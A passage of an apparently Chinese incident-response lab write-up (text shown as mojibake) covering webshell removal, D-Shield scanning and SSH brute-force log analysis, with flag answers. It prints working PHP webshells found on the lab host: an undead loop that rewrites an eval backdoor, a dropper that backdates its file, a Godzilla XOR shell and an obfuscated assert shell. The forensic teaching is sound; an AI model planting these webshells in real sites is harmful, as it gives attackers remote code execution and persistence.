class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;.ZYGS.php&#x27;</span>;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_GET[&quot;zygs&quot;])==&quot;e10adc3949ba59abbe56e057f20f883e&quot;)&#123;@eval($_POST[&quot;ZYGS&quot;]);&#125;?&gt;&#x27;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>,<span class="hljs-variable">$code</span>);<br>        <span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">5000</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¦æ¸…é™¤ä¸æ­»é©¬çš„è¯å°±éœ€è¦é€šè¿‡é‡å¯ä¸»æœºæˆ–æœåŠ¡ï¼Œæˆ–è€…æ¡ä»¶ç«äº‰çš„æ–¹å¼ä¿®æ”¹æ–‡ä»¶å†…å®¹</p><p><strong>å¼€å§‹æ’æŸ¥</strong></p><p>å…ˆè¿›webç›®å½•ï¼Œçœ‹åˆ°ä¸€ä¸ª1.phpé‡Œé¢æ˜¯ä¸€å¥è¯æœ¨é©¬</p><p><img src="http://cdn.clown2024.cn/202407151645934.png" alt="image-20240709111702355"></p><p>æŸ¥çœ‹å¼€æ”¾çš„ç«¯å£ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">netstat -pantu<br><span class="hljs-meta prompt_">#</span><span class="language-bash">--------</span><br>-p è¡¨ç¤ºæ˜¾ç¤ºè¿›ç¨‹æ ‡è¯†ç¬¦å’Œ/æˆ–è¿›ç¨‹åç§°ï¼Œè¿™å¯ä»¥å¸®åŠ©ä½ æŸ¥çœ‹å“ªä¸ªè¿›ç¨‹æ­£åœ¨ä½¿ç”¨ç½‘ç»œè¿æ¥ã€‚<br>-a è¡¨ç¤ºæ˜¾ç¤ºæ‰€æœ‰æ´»åŠ¨çš„ TCP è¿æ¥å’Œç›‘å¬ç«¯å£ã€‚<br>-n è¡¨ç¤ºä»¥æ•°å­—å½¢å¼æ˜¾ç¤ºåœ°å€å’Œç«¯å£å·ï¼Œä¸è¿›è¡ŒåŸŸåè§£æã€‚<br>-t è¡¨ç¤ºæ˜¾ç¤º TCP è¡¨ã€‚<br>-u è¡¨ç¤ºæ˜¾ç¤º UDP è¡¨ã€‚<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645935.png" alt="image-20240709112640729"></p><p>ç”¨è¯¥å‘½ä»¤æŸ¥æ‰¾ç‰¹å¾æ–‡ä»¶ï¼š</p><figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">find ./ -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br><span class="hljs-comment">#å°†æ ‡å‡†è¾“å…¥æ•°æ®è½¬æ¢æˆå‘½ä»¤è¡Œå‚æ•°ï¼Œä¹Ÿå°±æ˜¯å°†findçš„è¾“å…¥å˜æˆå‘½ä»¤è¡Œå‚æ•°ä¼ é€’ç»™grepå‘½ä»¤</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645936.png" alt="image-20240709112605958"></p><p>å»æŸ¥ä¸€ä¸‹å¯†ç ä¸º<strong>hello</strong></p><p><img src="http://cdn.clown2024.cn/202407151645937.png" alt="image-20240709112733521"></p><p>çœ‹ä¸€ä¸‹index.phpçš„å†…å®¹å¯ä»¥çŸ¥é“é€šè¿‡è¯¥æ–‡ä»¶ç”Ÿæˆï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">include</span>(SYS_ROOT.INC.<span class="hljs-string">&#x27;common.php&#x27;</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PATH_INFO&#x27;</span>].(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]?<span class="hljs-string">&#x27;?&#x27;</span>.<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;?&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$path</span>, <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)==<span class="hljs-string">&#x27;/&#x27;</span>)&#123;<br>        <span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$path</span>,<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-variable">$path</span> = <span class="hljs-title class_">Base</span>::<span class="hljs-title function_ invoke__">safeword</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-variable">$ctrl</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]:<span class="hljs-string">&#x27;run&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;createprocess&#x27;</span>]))<br>&#123;<br>        <span class="hljs-title class_">Index</span>::<span class="hljs-title function_ invoke__">createhtml</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]:<span class="hljs-number">0</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;single&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title class_">Index</span>::<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$path</span>);<br>&#125;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;/var/www/html/.shell.php&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$code</span>);<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;touch -m -d &quot;2021-01-01 00:00:01&quot; .shell.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">usleep</span>(<span class="hljs-number">3000</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é»‘å®¢ç•™äº†ä¸€ä¸ªæœ¨é©¬æ–‡ä»¶ï¼Œå°±æ˜¯<strong>shell(1).elf</strong>æ–‡ä»¶</p><p><img src="http://cdn.clown2024.cn/202407151645938.png" alt="image-20240709113120553"></p><p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰å¯æ‰§è¡Œæƒé™ï¼Œè¿™é‡ŒåŠ ä¸€ä¸ªæƒé™ï¼Œç„¶åå¼€å¦ä¸€ä¸ªç«¯å£æŸ¥çœ‹ç«¯å£æƒ…å†µ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 777 shell\(1\).elf<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645939.png" alt="image-20240709113441330"></p><p>æœ€åå¯ä»¥çœ‹åˆ°å…¶ipä¸º<strong>10.11.55.21</strong>ï¼Œç«¯å£ä¸º3333</p><p>æœ€ç»ˆçš„å„ä¸ªflagå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">flag&#123;1&#125;<br>flag&#123;hello&#125;<br>flag&#123;index.php&#125;<br>flag&#123;10.11.55.21&#125;<br>flag&#123;3333&#125;<br></code></pre></td></tr></table></figure><h2><span id="ç”¨å·¥å…·çš„åšæ³•">ç”¨å·¥å…·çš„åšæ³•</span></h2><p>ç”¨Dç›¾æ¥è¿›è¡Œæ‰«æ,ä¸è¿‡Dç›¾æ²¡æœ‰Linuxç‰ˆæœ¬ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡å°†è¿œç¨‹çš„Linuxæ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°Windowsä¸Šé¢ï¼Œç„¶åç”¨Dç›¾æ‰«å³å¯ã€‚</p><p>è¿™é‡Œå‚è€ƒè¿™ç¯‡æ–‡ç« æ¥å¸ƒç½®ï¼š<a href="https://developer.aliyun.com/article/1341008">https://developer.aliyun.com/article/1341008</a></p><p>é‡‡ç”¨çš„æ–¹æ³•æ˜¯<strong>winfsp + sshfs-win</strong>ï¼Œè¿™ä¸¤ä¸ªç›´æ¥ç½‘ä¸Šä¸‹è½½å®‰è£…å¥½å³å¯ï¼š<a href="https://winfsp.dev/rel/">https://winfsp.dev/rel/</a></p><p>ç¬¬ä¸€ç§æ–¹æ³•æ˜¯å³å‡»æ­¤ç”µè„‘é€‰æ‹©æ˜ å°„ç½‘ç»œé©±åŠ¨å™¨ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151645940.png" alt="image-20240709122109922"></p><blockquote><p>æˆ–è€…è¾“å…¥sshfs.rï¼Œsshfsæ˜¯æŒ‚è½½ç”¨æˆ·å®¶ç›®å½•ï¼Œsshfs.ræ˜¯æŒ‚è½½è¿œç¨‹çš„æ ¹ç›®å½•</p><p>ç‚¹å‡»å®Œæˆåè¾“å…¥å¯†ç å³å¯æŒ‚è½½</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151645941.png" alt="image-20240709122150458"></p><p>ç„¶åç›´æ¥ç”¨Dç›¾è¿›è¡Œæ‰«æwebç›®å½•ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151645942.png" alt="image-20240709122701725"></p><p>æˆ–è€…ç”¨sshfs-manage(sshfsçš„ç•Œé¢åŒ–å·¥å…·ï¼Œè¦å•ç‹¬å†å»ä¸‹è½½)å°†Linuxç›®å½•æŒ‚è½½åˆ°Windowsï¼Œè¿™é‡Œå°±æ‡’å¾—è¯•äº†ğŸ˜¥</p><p>è¿˜å¯ä»¥ç”¨net useå‘½ä»¤æŒ‚è½½ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net use              //åˆ—å‡ºæ‰€æœ‰ç½‘ç»œè¿æ¥<br>net use Z: /del      //åˆ é™¤æœ¬æœºæ˜ å°„çš„Zç›˜ <br>net use * /del /y    //åˆ é™¤æ‰€æœ‰æ˜ å°„å’ŒIPC$<br>net use Z: \\sshfs\root@192.168.1.120\/         //å°†å¯¹æ–¹æ ¹ç›®å½•æ˜ å°„ä¸ºZç›˜<br>net use Z: \\sshfs.r\root@192.168.1.120         //å°†å¯¹æ–¹æ ¹ç›®å½•æ˜ å°„ä¸ºZç›˜<br>net use Z: \\sshfs.r\root@192.168.1.120!1234    //å°†å¯¹æ–¹æ ¹ç›®å½•æ˜ å°„ä¸ºZç›˜ï¼ˆå…¶ä»–ç«¯å£ï¼‰<br></code></pre></td></tr></table></figure><h1><span id="weshellæŸ¥æ€">weshellæŸ¥æ€</span></h1><p>é¶æœºç®€ä»‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">é¶æœºè´¦å·å¯†ç  root xjwebshell<br>1.é»‘å®¢webshellé‡Œé¢çš„flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;<br>2.é»‘å®¢ä½¿ç”¨çš„ä»€ä¹ˆå·¥å…·çš„shell githubåœ°å€çš„md5 flag&#123;md5&#125;<br>3.é»‘å®¢éšè—shellçš„å®Œæ•´è·¯å¾„çš„md5 flag&#123;md5&#125; æ³¨ : /xxx/xxx/xxx/xxx/xxx.xxx<br>4.é»‘å®¢å…æ€é©¬å®Œæ•´è·¯å¾„ md5 flag&#123;md5&#125;<br></code></pre></td></tr></table></figure><p>ç›´æ¥ä¸ŠDç›¾æ‰«ï¼Œç”¨çš„è¿˜æ˜¯ä¸Šé¢çš„æ–¹æ³•</p><p><img src="http://cdn.clown2024.cn/202407151645943.png" alt="image-20240709155032413"></p><p>å…ˆçœ‹ä¸€ä¸ªç®€å•çš„shellæ–‡ä»¶</p><p><img src="http://cdn.clown2024.cn/202407151645944.png" alt="image-20240709155214961"></p><p>è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„webshell</p><p>å†æ‰¾æ‰¾å…¶ä»–çš„ï¼Œåœ¨gz.phpæ‰¾çš„çš„webshellæ¯”è¾ƒç‰¹åˆ«</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-comment">//027ccd04-5065-48b6-a32d-77c704a5e26d</span><br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;3c6e0b8a9c15224a&#x27;</span>;<br><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$data</span>!==<span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ç¬¬ä¸€ä¸ªflagï¼Œflag{027ccd04-5065-48b6-a32d-77c704a5e26d}</p><p>ç„¶åå°±æ˜¯çœ‹æ˜¯ä»€ä¹ˆç±»å‹çš„webshellï¼Œè¿™é‡Œå¯ä»¥æ˜æ˜¾çœ‹åˆ°æ˜¯å“¥æ–¯æ‹‰çš„æµé‡ç‰¹å¾ï¼Œæ˜¯å“¥æ–¯æ‹‰é‡Œé¢çš„ä¸€ä¸ªå¼‚æˆ–åŠ å¯†è„šæœ¬</p><p>å“¥æ–¯æ‹‰çš„githubåœ°å€ï¼š<a href="https://github.com/BeichenDream/Godzilla%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%9B%E8%A1%8Cmd5%E5%B0%B1%E6%98%AFflag%EF%BC%8Cflag%7B39392de3218c333f794befef07ac9257%7D">https://github.com/BeichenDream/Godzillaï¼Œç„¶åè¿›è¡Œmd5å°±æ˜¯flagï¼Œflag{39392de3218c333f794befef07ac9257}</a></p><p>éšè—shellå°±æ˜¯ä¸Šé¢Dç›¾æŸ¥æ‰¾å‡ºçš„.Mysqlli.php</p><p><img src="http://cdn.clown2024.cn/202407151645945.png" alt="image-20240709160839574"></p><p>ä¹Ÿæ˜¯ä¸€ä¸ªå“¥æ–¯æ‹‰çš„shellï¼Œè·¯å¾„å°±ä¸ºï¼š&#x2F;var&#x2F;www&#x2F;html&#x2F;include&#x2F;Db&#x2F;.Mysqli.phpï¼Œflagä¸ºflag{aebac0e58cd6c5fad1695ee4d1ac1919}</p><p>æœ€åä¸€ä¸ªæ˜¯å…æ€é©¬ï¼Œè¿™é‡Œé™æ€æ£€æµ‹å°±æ£€æµ‹ä¸åˆ°äº†ï¼Œä½†æ˜¯webshellæ‰§è¡Œçš„è¯ä¼šåœ¨æ—¥å¿—ç•™ä¸‹è®°å½•ï¼Œå¯ä»¥å»æ—¥å¿—é‡Œé¢çœ‹ä¸€çœ‹ï¼ŒLinuxçš„æ—¥å¿—åœ¨**&#x2F;var&#x2F;log**ç›®å½•ä¸‹</p><p>ä¸è¿‡Dç›¾å·²ç»æŠŠä»–æ‰«å‡ºæ¥äº†ï¼Œå°±æ˜¯top.phpï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨æ—¥å¿—access.logä¸­çœ‹åˆ°ä»–çš„è®°å½•</p><p><img src="http://cdn.clown2024.cn/202407151645946.png" alt="image-20240709161714553"></p><p>top.phpå†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;password&quot;</span>;<br><br><span class="hljs-comment">//ERsDHgEUC1hI</span><br><span class="hljs-variable">$fun</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>]);<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$fun</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$fun</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$fun</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">7</span>];<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;a&quot;</span>;<br><span class="hljs-variable">$s</span> = <span class="hljs-string">&quot;s&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$s</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func2&quot;</span>];<br><span class="hljs-variable">$c</span>(<span class="hljs-variable">$fun</span>);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¿›è¡Œäº†æ··æ·†å’ŒåŠ å¯†ï¼Œè·¯å¾„md5å°±æ˜¯flagï¼Œflag{EEFF2EABFD9B7A6D26FC1A53D3F7D1DE}</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/administratorlws/article/details/139521078%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89%E6%89%8B%E5%B7%A5%E6%9F%A5%E6%9D%80%E7%9A%84%E6%96%B9%E5%BC%8F%EF%BC%8C%E6%80%BB%E7%BB%93%E4%BA%86%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81webshell%E7%89%B9%E5%BE%81">https://blog.csdn.net/administratorlws/article/details/139521078ï¼Œé‡Œé¢æœ‰æ‰‹å·¥æŸ¥æ€çš„æ–¹å¼ï¼Œæ€»ç»“äº†ä¸€äº›å¸¸è§webshellç‰¹å¾</a></p><p>è¿™é‡Œcopyä¸€äº›çŸ¥è¯†ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//å„webshellçš„å±é™©å‡½æ•°<br>PHP: eval(), system(), exec(), shell_exec(), passthru(), assert(), base64_decode()<br>ASP: Execute(), Eval(), CreateObject()<br>JSP: Runtime.getRuntime().exec()<br><br>//æ–‡ä»¶æ“ä½œ<br>PHP: fopen(), fwrite(), file_get_contents(), file_put_contents()<br>ASP: FileSystemObject<br><br>//ç½‘ç»œæ“ä½œ<br>PHP: fsockopen(), curl_exec(), file_get_contents(&#x27;http://...&#x27;)<br>ASP: WinHttp.WinHttpRequest<br></code></pre></td></tr></table></figure><p>æ‰‹å·¥æŸ¥æ€å…æ€å¯ä»¥çœ‹ä»–æœ‰æ²¡æœ‰ç¼–ç å‡½æ•°</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find ./ <span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.php&quot;</span> | xargs grep <span class="hljs-string">&quot;eval(&quot;</span><br></code></pre></td></tr></table></figure><h1><span id="linuxæ—¥å¿—åˆ†æ">Linuxæ—¥å¿—åˆ†æ</span></h1><p>é¶æœºç®€ä»‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">è´¦å·rootå¯†ç linuxrz<br>ssh root@IP<br>1.æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºsshçš„rootå¸å·ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨&quot;,&quot;åˆ†å‰²<br>2.sshçˆ†ç ´æˆåŠŸç™»é™†çš„IPæ˜¯å¤šå°‘ï¼Œå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨&quot;,&quot;åˆ†å‰²<br>3.çˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿå¦‚æœæœ‰å¤šä¸ªä½¿ç”¨&quot;,&quot;åˆ†å‰²<br>4.ç™»é™†æˆåŠŸçš„IPå…±çˆ†ç ´äº†å¤šå°‘æ¬¡<br>5.é»‘å®¢ç™»é™†ä¸»æœºåæ–°å»ºäº†ä¸€ä¸ªåé—¨ç”¨æˆ·ï¼Œç”¨æˆ·åæ˜¯å¤šå°‘<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæŸ¥çœ‹æœ‰å¤šå°‘ipåœ¨çˆ†ç ´sshçš„rootè´¦å·é‚£å°±å»æŸ¥çœ‹&#x2F;var&#x2F;logä¸‹çš„æ—¥å¿—</p><p><img src="http://cdn.clown2024.cn/202407151645947.png" alt="image-20240709182756986"></p><p>çœ‹auth.log.1é‡Œé¢çš„ç™»é™†å¤±è´¥ä¿¡æ¯ï¼Œè¿™ä¸ªæ˜¯auth.logçš„å½’æ¡£æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password for root&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure><p>å‘½ä»¤è§£é‡Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cat /var/log/auth.log.1ï¼šcat å‘½ä»¤ç”¨äºè¿æ¥æ–‡ä»¶å¹¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ï¼Œè¿™é‡Œæ˜¯ç”¨æ¥æ˜¾ç¤º /var/log/auth.log.1 æ–‡ä»¶çš„å†…å®¹ã€‚<br><br>grep -a &quot;Failed password for root&quot;ï¼šgrep å‘½ä»¤ç”¨äºæœç´¢åŒ…å«ç‰¹å®šæ–‡æœ¬çš„è¡Œã€‚è¿™é‡Œæœç´¢çš„æ˜¯åŒ…å«æ–‡æœ¬ &quot;Failed password for root&quot; çš„è¡Œï¼Œè¡¨ç¤º root ç”¨æˆ·ç™»å½•å¤±è´¥çš„äº‹ä»¶ã€‚-a é€‰é¡¹æ˜¯å‘Šè¯‰ grep ä»¥æ–‡æœ¬æ–‡ä»¶çš„æ–¹å¼å¤„ç†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¿è¯è¾“å‡ºçš„ä¸€è‡´æ€§ã€‚<br><br>awk &#x27;&#123;print $11&#125;&#x27;ï¼šawk æ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ–‡æœ¬å¤„ç†å·¥å…·ã€‚è¿™é‡Œ &#123;print $11&#125; è¡¨ç¤ºæ‰“å°æ¯è¡Œçš„ç¬¬11ä¸ªå­—æ®µã€‚åœ¨ auth.log ä¸­ï¼Œç¬¬11ä¸ªå­—æ®µé€šå¸¸æ˜¯ç™»å½•å¤±è´¥æ—¶å°è¯•ä½¿ç”¨çš„ç”¨æˆ·åã€‚<br><br>sortï¼šsort å‘½ä»¤å¯¹è¾“å…¥çš„è¡Œè¿›è¡Œæ’åºã€‚ç”±äºå‰é¢ awk è¾“å‡ºçš„æ˜¯ root ç”¨æˆ·çš„ç™»å½•å¤±è´¥è¡Œï¼Œè¿™é‡Œçš„ sort å°†è¿™äº›è¡Œè¿›è¡Œå­—å…¸åºæ’åºã€‚<br><br>uniq -cï¼šuniq å‘½ä»¤ç”¨äºè¿‡æ»¤æ‰æ’åºåçš„é‡å¤è¡Œã€‚-c é€‰é¡¹è¡¨ç¤ºåœ¨æ¯è¡Œå‰æ˜¾ç¤ºè¯¥è¡Œåœ¨æ–‡ä»¶ä¸­å‡ºç°çš„æ¬¡æ•°ã€‚<br><br>sort -nrï¼šå†æ¬¡ä½¿ç”¨ sort å‘½ä»¤ï¼Œ-n é€‰é¡¹è¡¨ç¤ºæŒ‰ç…§æ•°å€¼æ’åºï¼Œ-r é€‰é¡¹è¡¨ç¤ºé™åºæ’åºã€‚è¿™é‡Œå¯¹ uniq å‘½ä»¤çš„è¾“å‡ºç»“æœæŒ‰å‡ºç°æ¬¡æ•°è¿›è¡Œé™åºæ’åºã€‚<br><br>moreï¼šmore å‘½ä»¤ç”¨äºåˆ†é¡µæ˜¾ç¤ºè¾“å‡ºç»“æœï¼Œå…è®¸ç”¨æˆ·é€æ­¥æŸ¥çœ‹é•¿è¾“å‡ºï¼Œè€Œä¸æ˜¯ä¸€æ¬¡æ€§æ˜¾ç¤ºæ‰€æœ‰å†…å®¹ã€‚<br></code></pre></td></tr></table></figure><p>å¯ä»¥æ‰¾åˆ°3ä¸ªip</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.200.2<br>192.168.200.32<br>192.168.200.31<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645948.png" alt="image-20240709183107694"></p><p>çˆ†ç ´æˆåŠŸçš„ç”¨æˆ·å°±å»æŸ¥â€Acceptedâ€çš„å­—æ®µ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Accepted&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr | more<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151645949.png" alt="image-20240709183249678"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">192.168.200.2<br></code></pre></td></tr></table></figure><p>çˆ†ç ´ç”¨æˆ·å‘½çš„å­—å…¸å°±æŸ¥â€Failed passwordâ€å­—æ®µ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs BASH"><span class="hljs-built_in">cat</span> /var/log/auth.log.1 | grep -a <span class="hljs-string">&quot;Failed password&quot;</span> |perl -e <span class="hljs-string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span>|<span 